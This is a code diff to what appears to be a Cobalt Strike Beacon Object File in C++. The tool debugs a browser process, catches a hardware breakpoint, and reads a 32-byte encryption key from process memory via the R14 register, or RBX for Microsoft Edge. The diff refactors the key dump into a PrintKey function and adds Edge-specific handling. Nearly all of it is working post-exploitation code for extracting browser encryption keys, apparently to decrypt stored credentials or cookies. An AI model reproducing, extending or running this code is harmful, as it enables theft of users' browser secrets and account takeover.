@@ -440,7 +440,30 @@ extern "C" {
         out[2 * len] = '\0';
     }
 
-    void DumpSecret(HANDLE hProc, HANDLE hThread) {
+    void PrintKey(HANDLE hProc, uintptr_t registryAddr) {
+        SIZE_T n = 0;
+        uintptr_t address = 0;
+        if (!ReadProcessMemory(hProc, (LPCVOID)registryAddr, &address, sizeof(uintptr_t), &n)) {
+            BeaconPrintf(CALLBACK_ERROR, "Failed to read contents of R14, Error: %lu\n", GetLastError());
+            return;
+        }
+        BeaconPrintf(CALLBACK_OUTPUT, "Encryption key will be at 0x%016llx\n", (unsigned long long)address);
+
+        n = 0;
+        const int keyLen = 32;
+        BYTE key[keyLen] = { 0 };
+        if (!ReadProcessMemory(hProc, (LPCVOID)address, &key, keyLen, &n)) {
+            BeaconPrintf(CALLBACK_ERROR, "Failed to read the key from address : 0x%016llx, Error: %lu\n", (unsigned long long)address, GetLastError());
+            return;
+        }
+
+        char keyHex[keyLen * 2 + 1];
+        ToHex(key, keyLen, keyHex);
+
+        BeaconPrintf(CALLBACK_OUTPUT, " Got key: %s \n", keyHex);
+    }
+
+    void DumpSecret(HANDLE hProc, HANDLE hThread, BOOL edge) {
         CONTEXT ctx = { 0 };
         ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL | CONTEXT_SEGMENTS;
 
@@ -464,26 +487,21 @@ extern "C" {
             return;
         }
 
-        SIZE_T n = 0;
-        uintptr_t address = 0;
-        if (!ReadProcessMemory(hProc, (LPCVOID)ctx.R14, &address, sizeof(uintptr_t), &n)) {
-            BeaconPrintf(CALLBACK_ERROR, "Failed to read contents of R14, Error: %lu\n", GetLastError());
-            return;
-        }
-        BeaconPrintf(CALLBACK_OUTPUT, "Encryption key will be at 0x%016llx\n", (unsigned long long)address);
-
-        n = 0;
-        const int keyLen = 32;
-        BYTE key[keyLen] = { 0 };
-        if (!ReadProcessMemory(hProc, (LPCVOID)address, &key, keyLen, &n)) {
-            BeaconPrintf(CALLBACK_ERROR, "Failed to read the key from address : 0x%016llx, Error: %lu\n", (unsigned long long)address, GetLastError());
+        if (edge && ctx.Rbx == 0)
+        {
+            BeaconPrintf(CALLBACK_ERROR, "RBX registry was empty\n");
             return;
         }
 
-        char keyHex[keyLen * 2 + 1];
-        ToHex(key, keyLen, keyHex);
-
-        BeaconPrintf(CALLBACK_OUTPUT, " Got key: %s \n", keyHex);
+        if (edge)
+        {
+            BeaconPrintf(CALLBACK_OUTPUT, "Dumping key from RBX\n");
+            PrintKey(hProc, ctx.Rbx);
+        }
+        else {
+            BeaconPrintf(CALLBACK_OUTPUT, "Dumping key from R14\n");
+            PrintKey(hProc, ctx.R14);
+        }
     }
 
     BOOL GetModuleName(HANDLE hProcess, const void* remote, wchar_t* dllName) {
@@ -554,7 +572,12 @@ extern "C" {
                         GetThreadContext(hThread, &c);
 
                         BeaconPrintf(CALLBACK_OUTPUT, " Hit HW breakpoint Execute at slot 0: RIP=0x%016llx\n", (unsigned long long)c.Rip);
-                        DumpSecret(hProcess, hThread);
+
+                        if (_wcsicmp(targetModule, L"msedge.dll") == 0)
+                            DumpSecret(hProcess, hThread, TRUE);
+                        else
+                            DumpSecret(hProcess, hThread, FALSE);
+                        
 
                         CloseHandle(hThread);
 
@@ -571,8 +594,12 @@ extern "C" {
                         if (hThread) {
                             DWORD exitCode;
                             if (GetExitCodeThread(hThread, &exitCode)) {
-                                if (exitCode == STILL_ACTIVE)
-                                    DumpSecret(hProcess, hThread);
+                                if (exitCode == STILL_ACTIVE) {
+                                    if (_wcsicmp(targetModule, L"msedge.dll") == 0)
+                                        DumpSecret(hProcess, hThread, TRUE);
+                                    else
+                                        DumpSecret(hProcess, hThread, FALSE);
+                                }
                                 else
                                     BeaconPrintf(CALLBACK_ERROR, "Thread %d has already exited. Exit code: %d\n", debugEvent.dwThreadId, exitCode);
                             }
